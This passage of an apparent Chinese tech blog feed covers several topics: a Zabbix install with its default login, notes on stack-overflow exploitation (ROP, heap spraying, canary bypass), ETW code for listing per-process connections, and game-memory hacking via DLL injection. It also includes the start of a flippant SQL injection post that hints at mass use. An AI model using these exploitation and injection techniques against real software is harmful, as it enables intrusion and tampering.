class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:/var/www/html/zabbix</span><span class="comment"># apt-get install gettext</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/var/www/html/zabbix</span><span class="comment"># ./locale/make_mo.sh </span></span><br><span class="line">./locale/fr/LC_MESSAGES/frontend.<span class="symbol">po:</span><span class="number">2060</span>: number of format specifications <span class="keyword">in</span> <span class="string">'msgid'</span> <span class="keyword">and</span> <span class="string">'msgstr'</span> does <span class="keyword">not</span> match</span><br><span class="line"><span class="symbol">msgfmt:</span> found <span class="number">1</span> fatal error</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/var/www/html/zabbix</span><span class="comment"># rm -rf locale/fr/ #反正也不用fr语言,删掉即可</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/var/www/html/zabbix</span><span class="comment"># ./locale/make_mo.sh</span></span><br></pre></td></tr></table></figure><p>默认的用户语言是<em>en_GB</em>,可以通过修改数据库中users表的lang字段为<em>zh_CN</em>来使用中文.</p><p>此时,zabbix就已经安装完成了.</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>使用默认账号密码Admin:zabbix登陆,就可web图形化配置.</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><span style="font-size:14px">参考资料</span></h1><p><a href="http://net-snmp.sourceforge.net/wiki/index.php/Net-Snmp_on_Ubuntu" target="_blank" rel="noopener">Net-Snmp wiki</a></p><p><a href="https://www.zabbix.com/documentation/4.0/manual/installation/install" target="_blank" rel="noopener">zabbix wiki</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;面试了一家公司,问我有没有用过zabbix.然而我并没有用过,讲道理之前最多打打补丁,系统搞搞加固,因为没出过什么大事也就一直这么搞了,并没有说时时刻刻监控着服务器,没有这个需求.&lt;br&gt;不过后来搜了搜,发现确实能解决一些痛点,于是就决定自己搭建一个看看怎么用.&lt;/p&gt;
&lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;p&gt;系统是debian(其实是kali),直接apt-get安装莫名其妙没有找到数据库的sql文件(后来发现在包里有),索性直接源码编译安装了&lt;br&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
    
      <category term="zabbix" scheme="http://blog.qwerdf.com/tags/zabbix/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习</title>
    <link href="http://blog.qwerdf.com/2018/12/31/overflow/"/>
    <id>http://blog.qwerdf.com/2018/12/31/overflow/</id>
    <published>2018-12-31T14:53:11.000Z</published>
    <updated>2018-12-31T15:12:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>简单来说，pwn既是使用某种方法，修改内存中的数据，劫持程序的执行流程(即改变eip)，使程序执行我们的shellcode。shellcode可以简单理解为一串汇编代码对应的机器码，因为它通常就是用机器代码编写的。</p><p>对于<em>call _fun</em>与<em>jmp _fun</em>他们都会使<em>eip</em>变为对于_fun的地址；而对于<em>ret</em>它实际上就是<em>pop eip</em>，如果此时栈顶的数据为我们的shellcode的地址，就可以实现pwn。</p><p>而如何修改内存中的数据呢？大概主要就是字符读取的函数函数<em>gets()</em>和<em>scanf()</em>与其类似的函数、字符串处理函数<em>strcpy()</em>和<em>strcat()</em>等函数，所造成的缓冲区溢出，从而覆盖返回地址/对内存地址进行赋值操作了。</p><a id="more"></a><h1 id="一般方法"><a href="#一般方法" class="headerlink" title="一般方法"></a>一般方法</h1><p>如果程序内有相应的功能函数，直接将<em>ret</em>时的栈顶esp，改为所选函数机器码开始的地址即可。</p><p>若没有相应的函数，则可将shellcode输入到堆栈内，并使<em>ret</em>时的栈顶esp改为shellcode开始的地址即可。其中shellcode的地址可通过<em>printf()</em>函数来泄露。</p><p>对于linux有PLT/POT表，对照结构，修改内存，可修改对应call的函数。</p><p>对于继承的class有一个叫做vptr的东西，根据其结构，修改内存中的函数地址，可修改所对应call的函数。</p><p>对于一些结构体(如链表)，通过uaf，也可修改指定内存位置的内容。</p><h1 id="DEP-NX"><a href="#DEP-NX" class="headerlink" title="DEP/NX"></a>DEP/NX</h1><p>处理器和Linux系统有一种叫做NX(No eXecute)的技术，windows上对应的技术叫做DEP(Data Execution Prevention)，使得一些内存不能拥有<em>RWX</em>中的<strong>X</strong>执行属性。若尝试在不能执行的内存(如堆栈)中执行，则报错。</p><p>此时，可使用ROP(Return-oriented programming)技术。具体操作为寻找以<em>ret</em>结尾，有<em>pop/lea/mov</em>的内存地址。以<em>ret</em>为主体，构造一个ROP链接，达到修改寄存器并调用指定call的目的。</p><h1 id="ASLR-PIE"><a href="#ASLR-PIE" class="headerlink" title="ASLR/PIE"></a>ASLR/PIE</h1><p>Linux系统有一种叫做PIE(Position-independent executables)的技术，windows上对应的技术叫做ALSR，使得程序中的内存地址不再固定，变得随机化了。同一个程序每次运行的内存地址，都会发生改变。</p><p>在ctf中一般通过地址泄露来获得相应的地址。</p><p>而在实际中，可使用一种叫做堆喷射(Heap Spraying)的技术。这种技术通过申请大量的内存空间，填充一些无意义的滑行指令，并将shellcode放到申请的内存空间的末端。这样，只要eip落到所申请的空间内，即可在执行一串无意义的滑行指令后，执行我们的shellcode。<br>典型的例子有：使用0x0c0c0c0c来填充内存空间，而其对应的汇编恰好为无意义的指令<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C0C | 0C 0C                | <span class="keyword">or</span>      <span class="built_in">al</span>, <span class="number">0xC</span>                    |</span><br><span class="line">0C0C0C0E | 0C 0C                | <span class="keyword">or</span>      <span class="built_in">al</span>, <span class="number">0xC</span>                    |</span><br></pre></td></tr></table></figure></p><h1 id="GS-Canaries"><a href="#GS-Canaries" class="headerlink" title="GS/Canaries"></a>GS/Canaries</h1><p>有一种叫做stack-protector 的技术，Linux系统中的gcc称之为为Canaries，windows上的cl称之为GS。即是在<em>return</em>前，检查堆栈上的一个于函数之前生成的随机数是否被改变。<br>要么在<em>return</em>前调用shellcode，要么通过泄露此随机数来使得检测通过。</p><p>有时候程序不退出，你甚至还能用这个来泄露地址。</p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p>使用<em>alpha_mixed</em>的encoders可生成由字母组成的shellcode，使用<em>–bad-chars</em>可排除一些字符</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><span class="_link" style="font-size:14px">参考资料</span></h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank" rel="noopener">Pwn Overview</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;简单来说，pwn既是使用某种方法，修改内存中的数据，劫持程序的执行流程(即改变eip)，使程序执行我们的shellcode。shellcode可以简单理解为一串汇编代码对应的机器码，因为它通常就是用机器代码编写的。&lt;/p&gt;
&lt;p&gt;对于&lt;em&gt;call _fun&lt;/em&gt;与&lt;em&gt;jmp _fun&lt;/em&gt;他们都会使&lt;em&gt;eip&lt;/em&gt;变为对于_fun的地址；而对于&lt;em&gt;ret&lt;/em&gt;它实际上就是&lt;em&gt;pop eip&lt;/em&gt;，如果此时栈顶的数据为我们的shellcode的地址，就可以实现pwn。&lt;/p&gt;
&lt;p&gt;而如何修改内存中的数据呢？大概主要就是字符读取的函数函数&lt;em&gt;gets()&lt;/em&gt;和&lt;em&gt;scanf()&lt;/em&gt;与其类似的函数、字符串处理函数&lt;em&gt;strcpy()&lt;/em&gt;和&lt;em&gt;strcat()&lt;/em&gt;等函数，所造成的缓冲区溢出，从而覆盖返回地址/对内存地址进行赋值操作了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="security" scheme="http://blog.qwerdf.com/tags/security/"/>
    
      <category term="asm" scheme="http://blog.qwerdf.com/tags/asm/"/>
    
  </entry>
  
  <entry>
    <title>获取pid对应Tcp与Udp连接的信息</title>
    <link href="http://blog.qwerdf.com/2018/11/23/tcp-udp-connect-info/"/>
    <id>http://blog.qwerdf.com/2018/11/23/tcp-udp-connect-info/</id>
    <published>2018-11-23T10:23:51.000Z</published>
    <updated>2019-01-09T09:37:35.232Z</updated>
    
    <content type="html"><![CDATA[<p>最近疯狂的在肝<a href="https://store.steampowered.com/app/230410/" target="_blank" rel="noopener">Warframe</a>，疯狂的挂生存模式，但是在开多人后总有人瞎玩搞乱，为了把他们踢出房间，我需要获取他们的ip。</p><h1 id="简单？"><a href="#简单？" class="headerlink" title="简单？"></a>简单？</h1><p>一开始用过<em>ipip.net</em>出的一个工具，能够获取到tcp与udp连接的源地址、目的地址与PID。但是有个问题，就是他那个工具用着用着就莫名其妙卡死了，所以遂决定自己造个一样的轮子。</p><a id="more"></a><p>google之，发现了Microsoft已为我们准备好了<em>GetExtendedTcpTable</em>与<em>GetExtendedUdpTable</em>,照着文档写了写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"iphlpapi.lib"</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">trueDWORD dwSize = <span class="number">0</span>;</span><br><span class="line">truePMIB_TCPTABLE_OWNER_PID pTcpTable = (PMIB_TCPTABLE_OWNER_PID)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(PMIB_TCPTABLE_OWNER_PID));</span><br><span class="line">trueGetExtendedTcpTable(pTcpTable, &amp;dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, <span class="number">0</span>);</span><br><span class="line">trueGetExtendedTcpTable(pTcpTable, &amp;dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, <span class="number">0</span>);</span><br><span class="line">true<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pTcpTable-&gt;dwNumEntries; i++)</span><br><span class="line">true&#123;</span><br><span class="line">truetrue<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (DWORD)pTcpTable-&gt;table[i].dwState &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">truetrue<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (DWORD)pTcpTable-&gt;table[i].dwLocalAddr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">truetrue<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (DWORD)pTcpTable-&gt;table[i].dwLocalPort &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">truetrue<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (DWORD)pTcpTable-&gt;table[i].dwRemoteAddr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">truetrue<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (DWORD)pTcpTable-&gt;table[i].dwRemotePort &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">truetrue<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (DWORD)pTcpTable-&gt;table[i].dwOwningPid &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">truetrue<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"======================================"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">true&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是tcp的获取方式，其中代码忽略了错误判断(一点都不健壮)。udp的获取方式也是差不多的，使用udp的函数即可。</p><h1 id="不简单！"><a href="#不简单！" class="headerlink" title="不简单！"></a>不简单！</h1><p>然而我还是太天真，写udp的时候发现了一个问题：微软给的<em>GetExtendedUdpTable</em>返回的结构体中并不包含目的地址与端口，只包含本地地址与端口。返回的结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MIB_UDPROW_OWNER_PID</span> &#123;</span></span><br><span class="line">  DWORD dwLocalAddr;</span><br><span class="line">  DWORD dwLocalPort;</span><br><span class="line">  DWORD dwOwningPid;</span><br><span class="line">&#125; MIB_UDPROW_OWNER_PID, *PMIB_UDPROW_OWNER_PID;</span><br></pre></td></tr></table></figure></p><p>我以为是我找错了API，然而换了<em>GetUdpTable</em>也不行，TCPView、ProcessHacker 甚至 <em>netstat -ano</em> 都没有提示udp的远程地址。又搜了搜，发现能够使用抓包的方式来获得远程的地址与端口，甚至有人修改了WINPCAP的驱动与wireshark，使得wireshark可以显示数据包的pid。</p><p>最后，我找到了LiveTcpUdpWatch，发现它能够实现之前提出的要求。他使用了Windows Event Track的技术，获取Windows Kernel中Tcp/Udp的日志，从而得到包含进程的pid、进程链接的本地与远程的地址与端口。大致代码如下(其实就是抄了抄官方给的<a href="https://docs.microsoft.com/en-us/windows/desktop/etw/using-tdhformatproperty-to-consume-event-data" target="_blank" rel="noopener">源码</a>)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INITGUID</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"tdh.lib"</span>)</span></span><br><span class="line">DEFINE_GUID( <span class="comment">/* bf3a50c5-a9c9-4988-a005-2df0b7c80f80 */</span></span><br><span class="line">trueUdpIpGuid,</span><br><span class="line">true<span class="number">0xbf3a50c5</span>,</span><br><span class="line">true<span class="number">0xa9c9</span>,</span><br><span class="line">true<span class="number">0x4988</span>,</span><br><span class="line">true<span class="number">0xa0</span>, <span class="number">0x05</span>, <span class="number">0x2d</span>, <span class="number">0xf0</span>, <span class="number">0xb7</span>, <span class="number">0xc8</span>, <span class="number">0x0f</span>, <span class="number">0x80</span></span><br><span class="line">);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//------------开启ETW</span></span><br><span class="line">    EVENT_TRACE_PROPERTIES* event_trace_prop = <span class="literal">nullptr</span>; </span><br><span class="line">    TCHAR logger_name[] = KERNEL_LOGGER_NAME;   <span class="comment">//内核</span></span><br><span class="line">    TRACEHANDLE trace_handler = <span class="literal">NULL</span>;     <span class="comment">//handle</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> buffer_size = <span class="keyword">sizeof</span>(EVENT_TRACE_PROPERTIES) + <span class="keyword">sizeof</span>(logger_name);</span><br><span class="line">    event_trace_prop = (EVENT_TRACE_PROPERTIES *)<span class="built_in">malloc</span>(buffer_size);</span><br><span class="line">    <span class="built_in">memset</span>(event_trace_prop, <span class="number">0</span>, buffer_size);</span><br><span class="line">    </span><br><span class="line">    EVENT_TRACE_PROPERTIES* event_trace_prop;</span><br><span class="line">    event_trace_prop-&gt;Wnode.BufferSize = buffer_size;</span><br><span class="line">    event_trace_prop-&gt;Wnode.Guid = SystemTraceControlGuid;</span><br><span class="line">    event_trace_prop-&gt;Wnode.ClientContext = <span class="number">2</span>;</span><br><span class="line">    event_trace_prop-&gt;Wnode.Flags |= WNODE_FLAG_TRACED_GUID;</span><br><span class="line">    event_trace_prop-&gt;LogFileMode = EVENT_TRACE_REAL_TIME_MODE;</span><br><span class="line">    event_trace_prop-&gt;EnableFlags = EVENT_TRACE_FLAG_NETWORK_TCPIP;</span><br><span class="line">    event_trace_prop-&gt;LogFileNameOffset = <span class="literal">NULL</span>;</span><br><span class="line">    event_trace_prop-&gt;LoggerNameOffset = <span class="keyword">sizeof</span>(EVENT_TRACE_PROPERTIES);</span><br><span class="line">    </span><br><span class="line">    StartTrace(&amp;trace_handler, logger_name, event_trace_prop);  <span class="comment">//start</span></span><br><span class="line">    <span class="comment">//------------关闭ETW</span></span><br><span class="line">    <span class="comment">//ControlTrace(NULL, logger_name, event_trace_prop, EVENT_TRACE_CONTROL_STOP);  //stop</span></span><br><span class="line">    <span class="comment">//-----------打开ETW的日志</span></span><br><span class="line">    TDHSTATUS status = ERROR_SUCCESS;</span><br><span class="line">    EVENT_TRACE_LOGFILE trace;</span><br><span class="line">    TRACE_LOGFILE_HEADER* pHeader = &amp;trace.LogfileHeader;</span><br><span class="line">    ZeroMemory(&amp;trace, <span class="keyword">sizeof</span>(EVENT_TRACE_LOGFILE));</span><br><span class="line">    trace.LogFileName = <span class="literal">NULL</span>;</span><br><span class="line">    trace.LoggerName = (LPWSTR)KERNEL_LOGGER_NAME;</span><br><span class="line">    trace.EventRecordCallback = (PEVENT_RECORD_CALLBACK)(ProcessEvent);   <span class="comment">//CallBack函数</span></span><br><span class="line">    trace.ProcessTraceMode = PROCESS_TRACE_MODE_EVENT_RECORD | PROCESS_TRACE_MODE_REAL_TIME;</span><br><span class="line">    g_hTrace = OpenTrace(&amp;trace);</span><br><span class="line">    ProcessTrace(&amp;g_hTrace, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">ProcessEvent</span><span class="params">(PEVENT_TRACE pEvent)</span></span>;</span><br><span class="line"><span class="comment">//在callback函数中，pEvent为传入的日志</span></span><br><span class="line"><span class="comment">//IsEqualGUID(pEvent-&gt;Header.Guid, UdpIpGuid) 用日志的GUID来判断日志的具体类型</span></span><br><span class="line"><span class="comment">//在函数中使用TDH(TdhFormatProperty)来格式化pEvent</span></span><br><span class="line"><span class="comment">//或MOF(GetPropertyQualifierSet)来获取事件的内容</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//在此处用pid为关键字，循环获取匹配日志并打印出来即可</span></span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>hook掉相应程序WS2_32.dll的网络相关的api也可以，不过因为我这是游戏，所以就没敢这么搞了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近疯狂的在肝&lt;a href=&quot;https://store.steampowered.com/app/230410/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Warframe&lt;/a&gt;，疯狂的挂生存模式，但是在开多人后总有人瞎玩搞乱，为了把他们踢出房间，我需要获取他们的ip。&lt;/p&gt;
&lt;h1 id=&quot;简单？&quot;&gt;&lt;a href=&quot;#简单？&quot; class=&quot;headerlink&quot; title=&quot;简单？&quot;&gt;&lt;/a&gt;简单？&lt;/h1&gt;&lt;p&gt;一开始用过&lt;em&gt;ipip.net&lt;/em&gt;出的一个工具，能够获取到tcp与udp连接的源地址、目的地址与PID。但是有个问题，就是他那个工具用着用着就莫名其妙卡死了，所以遂决定自己造个一样的轮子。&lt;/p&gt;
    
    </summary>
    
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
      <category term="code" scheme="http://blog.qwerdf.com/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>csgo 修改血量控制台命令</title>
    <link href="http://blog.qwerdf.com/2018/04/11/csgo-blood/"/>
    <id>http://blog.qwerdf.com/2018/04/11/csgo-blood/</id>
    <published>2018-04-11T06:47:35.000Z</published>
    <updated>2019-01-04T12:33:56.828Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ent_fire</span> !<span class="keyword">self </span><span class="keyword">addoutput </span><span class="string">"health 666"</span></span><br><span class="line"><span class="symbol">ent_fire</span> !<span class="keyword">self </span>SetHealth <span class="number">1337</span></span><br><span class="line"><span class="symbol">hurtme</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/uploads/2018-04-11_3.png" alt=""></p><p><a href="https://github.com/iisp33dii/CSGO-Netvar-Class-Dump/blob/master/DT_BasePlayer.txt" target="_blank" rel="noopener">参考连接</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight armasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
  </entry>
  
  <entry>
    <title>查找并修改游戏的内存数据</title>
    <link href="http://blog.qwerdf.com/2018/04/11/Modify-memory/"/>
    <id>http://blog.qwerdf.com/2018/04/11/Modify-memory/</id>
    <published>2018-04-10T21:02:16.000Z</published>
    <updated>2019-01-05T10:03:08.707Z</updated>
    
    <content type="html"><![CDATA[<p>身为一个手残，小时候玩游戏经常不能通关，于是各种修改器即是我的选择。小时候会用一些什么金山游侠之类的本土修改器，但是使用过程中往往有一个问题：游戏重新开始，或者软件关了重开后上次搜索出来的结果就不能再次使用了。当时也是对这类问题一头雾水，只好使用别人做好的修改器。</p><p></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="52" src="//music.163.com/outchain/player?type=2&id=28138236&auto=0&height=32"></iframe><p></p><a id="more"></a><h1 id="使用Cheat-Engine查找并修改数据"><a href="#使用Cheat-Engine查找并修改数据" class="headerlink" title="使用Cheat Engine查找并修改数据"></a>使用Cheat Engine查找并修改数据</h1><p>是个人都会的搜索–&gt;改变数值–&gt;继续搜索–&gt;改变数值–&gt;再搜索–&gt;找到地址。</p><p>找到正确地址后，通过下内存读取/内存写入断点找到修改此资源的汇编语句，通过该汇编语句寻找该地址的基地址与偏移量，并在此地址附近寻找有关资源数据。</p><h2 id="寻找资源地址的基地址与偏移量"><a href="#寻找资源地址的基地址与偏移量" class="headerlink" title="寻找资源地址的基地址与偏移量"></a>寻找资源地址的基地址与偏移量</h2><p>比如说，通过搜索寻找到了目标地址为 <em>0x6937d54</em> ，通过下断点的方式找到了写入的汇编语句为 <strong>movss [eax+0x04],xmm2</strong> ，其中 <em>eax=0x6937d54</em>。 那么这个eax的值即可能是基址，0x04即是偏移量。而这个eax是每个游戏进程，甚至每一局游戏都是不一样的，那么需要找到指向eax的指针，来确定新游戏中eax的值是多少，而不用每一局新游戏都进行一轮搜索了。</p><p><img src="/uploads/2018-04-11_1.png" alt="经过多次重复上述步骤后的结果"></p><p>一般游戏的一类资源都是存在同一个结构体中，所以我们可以观察不同偏移量的内存数值是否即是我们需要寻找的其他数值，从而进行下一步操作。</p><h2 id="在此地址附近寻找有关资源数据"><a href="#在此地址附近寻找有关资源数据" class="headerlink" title="在此地址附近寻找有关资源数据"></a>在此地址附近寻找有关资源数据</h2><p><img src="/uploads/2018-04-11_2.png" alt="所要寻找的其他资源"></p><p>如图所示，我们即可很方便的寻找到此游戏的资源所在内存，并进行修改。</p><h1 id="修改游戏流程实现自定义功能"><a href="#修改游戏流程实现自定义功能" class="headerlink" title="修改游戏流程实现自定义功能"></a>修改游戏流程实现自定义功能</h1><p>搞定在CE内修改后，我们需要实现一些更智能的功能。我们可以控制流程来使得原本减少的变成不变不减少的，甚至可以增加。如上图在内存中patch了 <em>可用人口</em> 的代码，使得可用人口不变。</p><h2 id="直接patch文件"><a href="#直接patch文件" class="headerlink" title="直接patch文件"></a>直接patch文件</h2><p>直接修改文件，实现硬补丁。</p><h2 id="外部来进行内存的修改"><a href="#外部来进行内存的修改" class="headerlink" title="外部来进行内存的修改"></a>外部来进行内存的修改</h2><p>即是使用如下三个函数</p><ul><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li></ul><p>内存中的基地址可以使用<code>OpenProcess --&gt; EnumProcessModules --&gt; GetModuleFileNameEx --&gt; GetModuleInformation</code>来获取<br>获取该程序运行后的基地址可以使用<a href="">这个办法</a></p><h2 id="通过注入DLL来修改自身"><a href="#通过注入DLL来修改自身" class="headerlink" title="通过注入DLL来修改自身"></a>通过注入DLL来修改自身</h2><p>注入了DLL后，就是被注入的进程的一部分了，想怎么搞怎么搞，简直就是为所欲为。</p><p>最基础的就是<code>VirtualAllocEx --&gt; CreateRemoteThread/NtCreateThreadEx/RtlCreateUserThread --&gt; LoadLibrary</code>，然后dll里在DLLMain内调相应的函数。</p><h2 id="上驱动修改内存"><a href="#上驱动修改内存" class="headerlink" title="上驱动修改内存"></a>上驱动修改内存</h2><p>ring0下想怎么搞就怎么搞，甚至还能无视ring3下的检测。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><span style="font-size:14px">参考资料</span></h1><p><a href="https://github.com/fdiskyou/injectAllTheThings" target="_blank" rel="noopener">injectAllTheThings</a></p><p><a href="http://forum.cheatengine.org/" target="_blank" rel="noopener">CE Forum</a></p><p><a href="https://stackoverflow.com/questions/14467229/get-base-address-of-process" target="_blank" rel="noopener">Get base address of process</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;身为一个手残，小时候玩游戏经常不能通关，于是各种修改器即是我的选择。小时候会用一些什么金山游侠之类的本土修改器，但是使用过程中往往有一个问题：游戏重新开始，或者软件关了重开后上次搜索出来的结果就不能再次使用了。当时也是对这类问题一头雾水，只好使用别人做好的修改器。&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;52&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=28138236&amp;auto=0&amp;height=32&quot;&gt;&lt;/iframe&gt;&lt;p&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
      <category term="security" scheme="http://blog.qwerdf.com/tags/security/"/>
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
  </entry>
  
  <entry>
    <title>sql injection</title>
    <link href="http://blog.qwerdf.com/2018/04/06/sql/"/>
    <id>http://blog.qwerdf.com/2018/04/06/sql/</id>
    <published>2018-04-06T12:19:18.000Z</published>
    <updated>2018-04-11T05:43:43.536Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.</p><p>SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐</p><h1 id="我选择IE6"><a href="#我选择IE6" class="headerlink" title="我选择IE6"></a>我选择IE6</h1><p>有比在IE里面上网冲浪更快乐的事情么?<br><a id="more"></a></p><h1 id="我选择自写脚本"><a href="#我选择自写脚本" class="headerlink" title="我选择自写脚本"></a>我选择自写脚本</h1><p>自写脚本更能针对化的对应环境,对于白盒测试<del>或者批量</del>值得使用.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 